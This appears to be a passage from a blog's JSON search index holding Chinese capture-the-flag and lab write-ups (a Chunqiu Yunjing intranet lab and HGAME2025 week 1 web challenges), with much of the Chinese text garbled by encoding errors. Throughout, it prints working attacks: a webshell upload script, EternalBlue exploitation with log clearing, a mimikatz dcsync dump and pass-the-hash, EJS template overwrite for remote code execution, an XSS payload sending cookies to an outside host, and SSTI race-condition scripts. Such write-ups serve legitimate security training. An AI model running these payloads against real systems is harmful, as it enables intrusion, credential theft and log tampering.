\u0026#39;r\u0026#39;)}) 20filepath = str(r.json()[\u0026#39;filepath\u0026#39;]) 21filepath = \u0026#34;/\u0026#34; + filepath.split(\u0026#39;.uptemp\u0026#39;)[0] + \u0026#39;.php\u0026#39; 22print(filepath) 23id = r.json()[\u0026#39;id\u0026#39;] 24url3 = url_pre + f\u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid={id}\u0026#39; 25r = session.get(url3) 26r = session.get(url_pre + filepath + \u0026#34;?1=system(\u0026#39;dir\u0026#39;);\u0026#34;) 27print(r.text) å†™é©¬ä¹‹åç›´æ¥è¯»flagå°±è¡Œ\nflag02: 2ce3-4813-87d4- FLAG3 æ°¸æ’ä¹‹è“å¯ä»¥ç”¨msfæ‰“\nç°åœ¨kaliä¸Šç”¨proxychains4ç®€å•é…ä¸ªä»£ç†\nproxychains4 msfconsole\rsearch ms17-010 æœ‰å››ä¸ªä¸åŒçš„æ¨¡å—\nè¿™é‡Œä½¿ç”¨ç¬¬ä¸€ä¸ªæ¨¡å—ï¼Œå› ä¸ºåˆ©ç”¨èŒƒå›´æ¯”è¾ƒå¹¿\nuse exploit/windows/smb/ms17_010_eternalblue # é€‰æ‹©ä½¿ç”¨çš„æ¨¡å—\rset payload windows/x64/meterpreter/bind_tcp_uuid # è®¾ç½®payloadï¼Œå¯ä»¥é€šè¿‡show payloadsæŸ¥çœ‹\rset RHOSTS 172.22.1.21 # è®¾ç½®é¶æœºçš„ip\rexploit # å‘èµ·æ”»å‡» æˆåŠŸäº†\nmeterpreter \u0026gt; screenshot # æ•è·å±å¹•\rmeterpreter \u0026gt; upload hello.txt c:// #ä¸Šä¼ æ–‡ä»¶\rmeterpreter \u0026gt; download d://1.txt # ä¸‹è½½æ–‡ä»¶\rmeterpreter \u0026gt; shell # è·å–cmd\rmeterpreter \u0026gt; clearev # æ¸…é™¤æ—¥å¿— load kiwi # è°ƒç”¨mimikatzæ¨¡å—\rkiwi_cmd \u0026#34;lsadump::dcsync /domain:xiaorang.lab /all /csv\u0026#34; exit # å¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·çš„ä¿¡æ¯(åŒ…æ‹¬å“ˆå¸Œå€¼) æ‹¿åˆ°Administrator ç”¨æˆ·çš„ hashï¼Œæ¥ç€ä½¿ç”¨ crackmapexec æ¥è¿›è¡Œå“ˆå¸Œä¼ é€’æ”»å‡»ï¼Œæ¥å®ç° DCåŸŸæ§ ä¸Šçš„ä»»æ„å‘½ä»¤æ‰§è¡Œ\nproxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x \u0026#34;type Users\\Administrator\\flag\\flag03.txt\u0026#34; æ‹¿åˆ°æœ€åä¸€ä¸ªflag\n","permalink":"http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial-writeup/","summary":"\u003cblockquote\u003e\n\u003cp\u003eå‚è€ƒæ–‡ç« \u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\"\u003ehttps://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\u003c/a\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003eèœé¸¡ç¬¬ä¸€ä¸ªé€šå…³çš„é¶åœºOrz\u003c/p\u003e\n\u003ch3 id=\"flag1\"\u003eFLAG1\u003c/h3\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250306184027336\" loading=\"lazy\" src=\"../assets/image-20250306184027336.png\"\u003e\u003c/p\u003e\n\u003cp\u003efscanæ‰«ä¸€ä¸‹\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e./fscan.exe -h 39.99.139.119\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg alt=\"image-20250306184106697\" loading=\"lazy\" src=\"../assets/image-20250306184106697.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç›´æ¥ç”¨thinkphpguiå†™é©¬è¿èšå‰‘\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250306185409381\" loading=\"lazy\" src=\"../assets/image-20250306185409381.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå…ˆç”¨vshellä¸Šçº¿\u003c/p\u003e\n\u003cp\u003eè¯»flagéœ€è¦ææƒ\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/peass-ng/PEASS-ng\"\u003epeass-ng/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)\u003c/a\u003e\u003c/p\u003e","title":"æ˜¥ç§‹äº‘é•œ-Initial-Writeup"},{"content":"Web week1 Level 24 Pacman æ‹¿åˆ°ç¯å¢ƒ\nä¸€ä¸ªå°æ¸¸æˆï¼ŒçŒœæµ‹åº”è¯¥æ˜¯jså®¡è®¡\næŸ¥çœ‹index.jså‘ç°ä»£ç è¿›è¡Œäº†æ··æ·†\nå¯ä»¥ç”¨å·¥å…·åæ··æ·†ä¸€ä¸‹ï¼Œå¢åŠ ä¸€ä¸‹å¯è¯»æ€§\nhttps://tool.yuanrenxue.cn/decode_obfuscator\nåæ··æ·†ä¹‹åæ‰¾åˆ°è¿™ä¸ª\næ„Ÿè§‰æ˜¯æ …æ ï¼Œè§£å¯†æ‹¿åˆ°flag\nLevel 47 BandBomb æ–‡ä»¶ä¸Šä¼ \né™„ä»¶æœ‰æºç \n1const express = require(\u0026#39;express\u0026#39;); 2const multer = require(\u0026#39;multer\u0026#39;); 3const fs = require(\u0026#39;fs\u0026#39;); 4const path = require(\u0026#39;path\u0026#39;); 5 6const app = express(); 7 8app.set(\u0026#39;view engine\u0026#39;, \u0026#39;ejs\u0026#39;); 9 10app.use(\u0026#39;/static\u0026#39;, express.static(path.join(__dirname, \u0026#39;public\u0026#39;))); 11app.use(express.json()); 12 13const storage = multer.diskStorage({ 14 destination: (req, file, cb) =\u0026gt; { 15 const uploadDir = \u0026#39;uploads\u0026#39;; 16 if (!fs.existsSync(uploadDir)) { 17 fs.mkdirSync(uploadDir); 18 } 19 cb(null, uploadDir); 20 }, 21 filename: (req, file, cb) =\u0026gt; { 22 cb(null, file.originalname); 23 } 24}); 25 26const upload = multer({ 27 storage: storage, 28 fileFilter: (_, file, cb) =\u0026gt; { 29 try { 30 if (!file.originalname) { 31 return cb(new Error(\u0026#39;æ— æ•ˆçš„æ–‡ä»¶å\u0026#39;), false); 32 } 33 cb(null, true); 34 } catch (err) { 35 cb(new Error(\u0026#39;æ–‡ä»¶å¤„ç†é”™è¯¯\u0026#39;), false); 36 } 37 } 38}); 39 40app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { 41 const uploadsDir = path.join(__dirname, \u0026#39;uploads\u0026#39;); 42 43 if (!fs.existsSync(uploadsDir)) { 44 fs.mkdirSync(uploadsDir); 45 } 46 47 fs.readdir(uploadsDir, (err, files) =\u0026gt; { 48 if (err) { 49 return res.status(500).render(\u0026#39;mortis\u0026#39;, { files: [] }); 50 } 51 res.render(\u0026#39;mortis\u0026#39;, { files: files }); 52 }); 53}); 54 55app.post(\u0026#39;/upload\u0026#39;, (req, res) =\u0026gt; { 56 upload.single(\u0026#39;file\u0026#39;)(req, res, (err) =\u0026gt; { 57 if (err) { 58 return res.status(400).json({ error: err.message }); 59 } 60 if (!req.file) { 61 return res.status(400).json({ error: \u0026#39;æ²¡æœ‰é€‰æ‹©æ–‡ä»¶\u0026#39; }); 62 } 63 res.json({ 64 message: \u0026#39;æ–‡ä»¶ä¸Šä¼ æˆåŠŸ\u0026#39;, 65 filename: req.file.filename 66 }); 67 }); 68}); 69 70app.post(\u0026#39;/rename\u0026#39;, (req, res) =\u0026gt; { 71 const { oldName, newName } = req.body; 72 const oldPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, oldName); 73 const newPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, newName); 74 75 if (!oldName || !newName) { 76 return res.status(400).json({ error: \u0026#39; \u0026#39; }); 77 } 78 79 fs.rename(oldPath, newPath, (err) =\u0026gt; { 80 if (err) { 81 return res.status(500).json({ error: \u0026#39; \u0026#39; + err.message }); 82 } 83 res.json({ message: \u0026#39; \u0026#39; }); 84 }); 85}); 86 87app.listen(port, () =\u0026gt; { 88 console.log(`æœåŠ¡å™¨è¿è¡Œåœ¨ http://localhost:${port}`); 89}); è¿™é¢˜æœ‰ç‚¹åƒ24å›½èµ›çš„ezjs\næ–‡ç«  - å¯¹ejså¼•æ“æ¼æ´åŠå‡½æ•°ç‰¹æ€§çš„åˆ©ç”¨ - å…ˆçŸ¥ç¤¾åŒº\nå¯ä»¥çœ‹åˆ°åœ¨ /rename è·¯ç”±\n1app.post(\u0026#39;/rename\u0026#39;, (req, res) =\u0026gt; { 2 const { oldName, newName } = req.body; 3 const oldPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, oldName); 4 const newPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, newName); 5 6 if (!oldName || !newName) { 7 return res.status(400).json({ error: \u0026#39; \u0026#39; }); 8 } 9 10 fs.rename(oldPath, newPath, (err) =\u0026gt; { 11 if (err) { 12 return res.status(500).json({ error: \u0026#39; \u0026#39; + err.message }); 13 } 14 res.json({ message: \u0026#39; \u0026#39; }); 15 }); 16}); è¿™ä¸ªè·¯ç”±ä¼šå°†uploadsç›®å½•ä¸­çš„æ–‡ä»¶é‡å‘½å\næˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªè·¯ç”±ï¼Œé€šè¿‡ç›®å½•ç©¿è¶Šå¯¹ä»»æ„æ–‡ä»¶è¿›è¡Œç§»åŠ¨å’Œé‡å‘½å\nä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸Šä¼ æ¶æ„çš„ejsåˆ°uploadsç›®å½•ï¼Œæ¥ç€é€šè¿‡/renameè·¯ç”±å°†æˆ‘ä»¬ä¸Šä¼ çš„æ¶æ„ejsæ–‡ä»¶è¦†å†™æ‰/è·¯ç”±çš„æ¨¡æ¿æ–‡ä»¶mortis.ejså®ç°RCE\neval.ejs\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt; \u0026lt;%= process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;whoami\u0026#39;) %\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; å°†ejsä¸Šä¼ \nè¦†å†™åŸæ¥çš„ejs\nè®¿é—®/\nè¿™é¢˜flagè—åœ¨ç¯å¢ƒå˜é‡é‡Œ\npayload:\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt; \u0026lt;%= process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;printenv\u0026#39;) %\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Level 69 MysteryMessageBoard å¯†ç çˆ†ç ´ï¼ŒXSS cookieçªƒå–\nçˆ†å‡ºæ¥ shallot/888888\nç™»è¿›å»çœ‹åˆ°ä¸€ä¸ªç•™è¨€æ¿\nçŒœæµ‹æ˜¯xssï¼Œæµ‹è¯•ä¸€ä¸‹\n\u0026lt;script\u0026gt;alert(\u0026#39;XSS\u0026#39;)\u0026lt;/script\u0026gt; åŒæ—¶é€šè¿‡dirsearchæ‰«åˆ°äº†/adminè·¯ç”±\næ ¹æ®è¿™å¥è¯å¤§æ¦‚å¯ä»¥çŒœåˆ°ï¼Œè®¿é—®/adminè·¯ç”±çš„æ—¶å€™åº”è¯¥ä¼šåœ¨åç«¯ä»¥adminçš„èº«ä»½æ¥è®¿é—®ç•™è¨€æ¿\nä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥è¿›è¡Œcookieçªƒå–\npayload:\n\u0026lt;script\u0026gt;document.location=\u0026#39;http://dfny33.ceye.io?\u0026#39;+document.cookie;\u0026lt;/script\u0026gt; å°†payloadè¾“å‡ºåœ¨ç•™è¨€æ¿ï¼Œç„¶åè®¿é—®/admin\næˆåŠŸæ‹¿åˆ°adminçš„cookie\næ‹¿adminçš„cookieè®¿é—®/flagå³å¯æ‹¿åˆ°flag\nLevel 25 åŒé¢äººæ´¾å¯¹ è¿™é“é¢˜æœ‰ä¸¤ä¸ªç¯å¢ƒï¼Œä¸€å¼€å§‹ä»¥ä¸ºæ˜¯reï¼Œå…¶å®æ„Ÿè§‰æ›´åƒæ˜¯misc\nè®¿é—®app.service-webå¯ä»¥æ‹¿åˆ°ä¸€ä¸ªmainæ–‡ä»¶\næ˜¯ä¸€ä¸ªelfæ–‡ä»¶\nç”¨exeinfo PEæŸ¥åˆ°ç”¨upxåŠ å£³äº†\nç”¨upxå®˜æ–¹å·¥å…·å°±å¯ä»¥è„±å£³\nhttps://github.com/upx/upx/releases/latest\nè„±å£³ä¹‹åç”¨idaæ‰“å¼€\nå¯ä»¥æ‰¾åˆ°ä¸€æ®µå…³äºminioçš„å¯†é’¥ä¿¡æ¯\n.noptrdata:0000000000D614E0\t000000AA\tC\tminio:\\r\\n endpoint: \\\u0026#34;127.0.0.1:9000\\\u0026#34;\\r\\n access_key: \\\u0026#34;minio_admin\\\u0026#34;\\r\\n secret_key: \\\u0026#34;JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs=\\\u0026#34;\\r\\n bucket: \\\u0026#34;prodbucket\\\u0026#34;\\r\\n key: \\\u0026#34;update\\\u0026#34; é‚£æˆ‘ä»¬å¤§æ¦‚å°±èƒ½çŒœåˆ°å¦ä¸€ä¸ªç¯å¢ƒåº”è¯¥å°±æ˜¯è¿™ä¸ªminioçš„æœåŠ¡\nç”¨mcé€šè¿‡Access Keyå’ŒSecret Keyè¿æ¥ä¸Šå»\né‡Œé¢æœ‰ä¸¤ä¸ªå‚¨å­˜æ¡¶\nå°†ä¸¤ä¸ªå‚¨å­˜æ¡¶éƒ½ä¸‹è½½ä¸‹æ¥\n/hintsé‡Œé¢æ”¾çš„æ˜¯8080æœåŠ¡çš„æºç ï¼Œ/prodbucketé‡Œé¢æ˜¯æºç ç¼–è¯‘åçš„æ–‡ä»¶å«åšupdateï¼ŒçŒœæµ‹æ˜¯çƒ­æ›´æ–°\nçœ‹ä¸€ä¸‹æºç \n1package main 2 3import ( 4\t\u0026#34;level25/fetch\u0026#34; 5\t\u0026#34;level25/conf\u0026#34; 6\t\u0026#34;github.com/gin-gonic/gin\u0026#34; 7\t\u0026#34;github.com/jpillora/overseer\u0026#34; 8) 9 10func main() { 11\tfetcher := \u0026amp;fetch.MinioFetcher{ 12\tBucket: conf.MinioBucket, 13\tKey: conf.MinioKey, 14\tEndpoint: conf.MinioEndpoint, 15\tAccessKey: conf.MinioAccessKey, 16\tSecretKey: conf.MinioSecretKey, 17\t} 18\toverseer.Run(overseer.Config{ 19\tProgram: program, 20\tFetcher: fetcher, 21\t}) 22 23} 24 25func program(state overseer.State) { 26\tg := gin.Default() 27\tg.StaticFS(\u0026#34;/\u0026#34;, gin.Dir(\u0026#34;.\u0026#34;, true)) 28\tg.Run(\u0026#34;:8080\u0026#34;) 29} æˆ‘ä»¬å¯ä»¥çŒœæµ‹/è·¯ç”±å±•ç¤ºçš„è¿™ä¸ª.ç›®å½•å°±æ˜¯å‰é¢æˆ‘ä»¬ä¸‹å‘¨mainæ–‡ä»¶çš„ç›®å½•\næˆ‘ä»¬å¯ä»¥æŠŠ.æ”¹æˆæ ¹ç›®å½•/ï¼Œç„¶åå°†ç¼–è¯‘åçš„æºç è¦†å†™æ‰åŸæ¥çš„updateï¼Œçƒ­æ›´æ–°åï¼Œæˆ‘ä»¬å°±èƒ½ç›´æ¥è®¿é—®æ ¹ç›®å½•äº†\npayload:\npackage main import ( \u0026#34;level25/fetch\u0026#34; \u0026#34;level25/conf\u0026#34; \u0026#34;github.com/gin-gonic/gin\u0026#34; \u0026#34;github.com/jpillora/overseer\u0026#34; ) func main() { fetcher := \u0026amp;fetch.MinioFetcher{ Bucket: conf.MinioBucket, Key: conf.MinioKey, Endpoint: conf.MinioEndpoint, AccessKey: conf.MinioAccessKey, SecretKey: conf.MinioSecretKey, } overseer.Run(overseer.Config{ Program: program, Fetcher: fetcher, }) } func program(state overseer.State) { g := gin.Default() g.StaticFS(\u0026#34;/abc\u0026#34;, gin.Dir(\u0026#34;/\u0026#34;, true)) g.Run(\u0026#34;:8080\u0026#34;) } è¿™é‡Œæˆ‘å°†/è·¯ç”±æ”¹æˆäº†/abcï¼Œå› ä¸ºä¸çŸ¥é“ä¸ºå•¥æˆ‘ç”¨/è·¯ç”±ä¸è¡Œ\nå°†æºç ç¼–è¯‘åè¦†å†™åˆ°å‚¨å­˜æ¡¶ä¸Š\nè®¿é—®/abc\næ‹¿åˆ°flag\nLevel 38475 è§’è½ ssti/æ¡ä»¶ç«äº‰\n/robots.txtæœ‰ä¸ª/app.conf\nè®¿é—®/app.conf\nè¿™é‡Œå±•ç¤ºäº†httpd.confçš„ç‰‡æ®µ\nè¿™é‡Œç»™å‡ºäº†æºç çš„ä½ç½®è¿˜æœ‰ä¸€ä¸ªé‡å†™å¼•æ“çš„è§„åˆ™ï¼ŒçŒœæµ‹åº”è¯¥æ˜¯è¯¥ç‰ˆæœ¬çš„apacheå­˜åœ¨æºç æ³„éœ²\nåŒæ—¶åœ¨å“åº”æ ‡å¤´èƒ½æ‰¾åˆ°Apacheçš„ç‰ˆæœ¬ä¿¡æ¯\nå¯ä»¥æ‰¾åˆ°è¿™ä¸ªç‰ˆæœ¬çš„apacheå­˜åœ¨æºç æ³„éœ²ï¼Œè€Œä¸”æ˜¯è·Ÿé‡å†™è§„åˆ™æœ‰å…³\nCVE-2024-38475\nç½‘ä¸Šæ²¡æ‰¾åˆ°ä»€ä¹ˆpoc\nä½†æ˜¯å¯ä»¥æ‰¾åˆ°æ¼æ´å‘ç°è€…çš„ä¸€ç¯‡æ–‡ç« \nhttps://blog.orange.tw/posts/2024-08-confusion-attacks-en/\næ ¹æ®è¿™ç¯‡æ–‡ç« æˆ‘ä»¬å¯ä»¥æ„é€ å‡ºpaylaod\nhttp://node1.hgame.vidar.club:31155/admin/usr/local/apache2/app/app.py%3F è¿™é“é¢˜å¤šäº†ä¸€ä¸ªRewriteCond \u0026ldquo;%{HTTP_USER_AGENT}\u0026rdquo; \u0026ldquo;^L1nk/\u0026rdquo;ï¼Œåªéœ€è¦åœ¨user-agentå‰é¢åŠ ä¸ŠL1nk/å³å¯\næ‹¿åˆ°æºç \n1from flask import Flask, request, render_template, render_template_string, redirect 2import os 3import templates 4 5app = Flask(__name__) 6pwd = os.path.dirname(__file__) 7show_msg = templates.show_msg 8 9 10def readmsg(): 11\tfilename = pwd + \u0026#34;/tmp/message.txt\u0026#34; 12\tif os.path.exists(filename): 13\tf = open(filename, \u0026#39;r\u0026#39;) 14\tmessage = f.read() 15\tf.close() 16\treturn message 17\telse: 18\treturn \u0026#39;No message now.\u0026#39; 19 20 21@app.route(\u0026#39;/index\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 22def index(): 23\tstatus = request.args.get(\u0026#39;status\u0026#39;) 24\tif status is None: 25\tstatus = \u0026#39;\u0026#39; 26\treturn render_template(\u0026#34;index.html\u0026#34;, status=status) 27 28 29@app.route(\u0026#39;/send\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) 30def write_message(): 31\tfilename = pwd + \u0026#34;/tmp/message.txt\u0026#34; 32\tmessage = request.form[\u0026#39;message\u0026#39;] 33 34\tf = open(filename, \u0026#39;w\u0026#39;) 35\tf.write(message) 36\tf.close() 37 38\treturn redirect(\u0026#39;index?status=Send successfully!!\u0026#39;) 39\t40@app.route(\u0026#39;/read\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 41def read_message(): 42\tif \u0026#34;{\u0026#34; not in readmsg(): 43\tshow = show_msg.replace(\u0026#34;{{message}}\u0026#34;, readmsg()) 44\treturn render_template_string(show) 45\treturn \u0026#39;waf!!\u0026#39; 46\t47 48if __name__ == \u0026#39;__main__\u0026#39;: 49\tapp.run(host = \u0026#39;0.0.0.0\u0026#39;, port = 5000) å¯ä»¥çœ‹åˆ°/readè·¯ç”±å­˜åœ¨sstiï¼Œä½†æ˜¯ä»–wafæ‰äº†æœ€é‡è¦çš„{\nä½†æ˜¯å¯ä»¥çœ‹åˆ°è¿™ä¸ª/sendè·¯ç”±ä¼šå°†ä¼ å…¥çš„ä¿¡æ¯å†™å…¥message.txtæ–‡ä»¶ï¼Œåœ¨è®¿é—®/readè·¯ç”±çš„æ—¶å€™åˆ™ä¼šè¯»å–message.txtæ–‡ä»¶ã€‚è¿™ä¹ˆä¸€æ¥æˆ‘ä»¬å°±å¯ä»¥è€ƒè™‘é€šè¿‡ç«äº‰çš„æ–¹å¼æ¥ç»•è¿‡wafäº†ã€‚ç«äº‰æ€è·¯å¤§æ¦‚å°±æ˜¯æˆ‘åœ¨å¾ˆçŸ­çš„æ—¶é—´å†…è¿ç»­å‘é€ä¸¤æ¡ä¿¡æ¯ï¼Œç¬¬ä¸€æ¡ä¿¡æ¯æ˜¯åˆæ³•ä¿¡æ¯ï¼Œè€Œç¬¬äºŒæ¡ä¿¡æ¯æ˜¯ä¸åˆæ³•çš„ï¼Œé‚£ä¹ˆå°±ä¼šå­˜åœ¨ä¸€ç§æƒ…å†µï¼Œå½“ç¬¬ä¸€æ¡ä¿¡æ¯é€šè¿‡äº†åˆ¤æ–­ï¼Œæ¥ä¸‹æ¥è¦å°†æ–‡ä»¶çš„å†…å®¹æ’å…¥åˆ°æ¨¡æ¿ä¸­æ¸²æŸ“çš„æ—¶å€™ï¼Œåˆšå¥½ç¬¬äºŒæ¡ä¸åˆæ³•çš„ä¿¡æ¯è¦†å†™äº†message.txtï¼Œé‚£ä¹ˆæ’å…¥æ¨¡æ¿ä¸­çš„å°±æ˜¯ç¬¬äºŒæ¡ä¸åˆæ³•çš„ä¿¡æ¯äº†\næ¥ä¸‹æ¥å°±æ˜¯æ“è„šæœ¬å‘åŒ…\nä¸‰ä¸ªè„šæœ¬\npoc1\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/send\u0026#34; 4 burp0_headers = {\u0026#34;Cache-Control\u0026#34;: \u0026#34;max-age=0\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762/app/index\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 burp0_data = {\u0026#34;message\u0026#34;: \u0026#34;{{config.__class__.__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;cat /flag\u0026#39;).read()}}\u0026#34;} 6 res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) 7 print(res.status_code) 8 poc2\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/send\u0026#34; 4 burp0_headers = {\u0026#34;Cache-Control\u0026#34;: \u0026#34;max-age=0\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762/app/index\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 burp0_data = {\u0026#34;message\u0026#34;: \u0026#34;123\u0026#34;} 6 res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) 7 print(res.status_code) poc3\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/read\u0026#34; 4 burp0_headers = {\u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 res = requests.get(burp0_url, headers=burp0_headers) 6 # print(res.text) 7 if \u0026#34;hgame\u0026#34; in (res.text): 8 print(res.text) 9 break æˆåŠŸæ‰§è¡Œï¼Œæ‹¿åˆ°flag\n","permalink":"http://localhost:1313/post/hgame2025-week1/","summary":"\u003ch2 id=\"web\"\u003eWeb\u003c/h2\u003e\n\u003ch3 id=\"week1\"\u003eweek1\u003c/h3\u003e\n\u003ch3 id=\"level-24-pacman\"\u003eLevel 24 Pacman\u003c/h3\u003e\n\u003cp\u003eæ‹¿åˆ°ç¯å¢ƒ\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206151704506\" loading=\"lazy\" src=\"../assets/image-20250206151704506.png\"\u003e\u003c/p\u003e\n\u003cp\u003eä¸€ä¸ªå°æ¸¸æˆï¼ŒçŒœæµ‹åº”è¯¥æ˜¯jså®¡è®¡\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206151846623\" loading=\"lazy\" src=\"../assets/image-20250206151846623.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæŸ¥çœ‹index.jså‘ç°ä»£ç è¿›è¡Œäº†æ··æ·†\u003c/p\u003e\n\u003cp\u003eå¯ä»¥ç”¨å·¥å…·åæ··æ·†ä¸€ä¸‹ï¼Œå¢åŠ ä¸€ä¸‹å¯è¯»æ€§\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://tool.yuanrenxue.cn/decode_obfuscator\"\u003ehttps://tool.yuanrenxue.cn/decode_obfuscator\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206152531656\" loading=\"lazy\" src=\"../assets/image-20250206152531656.png\"\u003e\u003c/p\u003e\n\u003cp\u003eåæ··æ·†ä¹‹åæ‰¾åˆ°è¿™ä¸ª\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206152608227\" loading=\"lazy\" src=\"../assets/image-20250206152608227.png\"\u003e\u003c/p\u003e","title":"HGAME2025 WEEK1"},{"content":"","permalink":"http://localhost:1313/about/","summary":"about","title":"å…³äº"},{"content":"Tsclientæ˜¯ä¸€å¥—éš¾åº¦ä¸ºä¸­ç­‰çš„é¶åœºç¯å¢ƒï¼Œå®Œæˆè¯¥æŒ‘æˆ˜å¯ä»¥å¸®åŠ©ç©å®¶äº†è§£å†…ç½‘æ¸—é€ä¸­çš„ä»£ç†è½¬å‘ã€å†…ç½‘æ‰«æã€ä¿¡æ¯æ”¶é›†ã€ç‰¹æƒæå‡ä»¥åŠæ¨ªå‘ç§»åŠ¨æŠ€æœ¯æ–¹æ³•ï¼ŒåŠ å¼ºå¯¹åŸŸç¯å¢ƒæ ¸å¿ƒè®¤è¯æœºåˆ¶çš„ç†è§£ï¼Œä»¥åŠæŒæ¡åŸŸç¯å¢ƒæ¸—é€ä¸­ä¸€äº›æœ‰è¶£çš„æŠ€æœ¯è¦ç‚¹ã€‚è¯¥é¶åœºå…±æœ‰3ä¸ªflagï¼Œåˆ†å¸ƒäºä¸åŒçš„é¶æœºã€‚\nå‚è€ƒæ–‡ç« 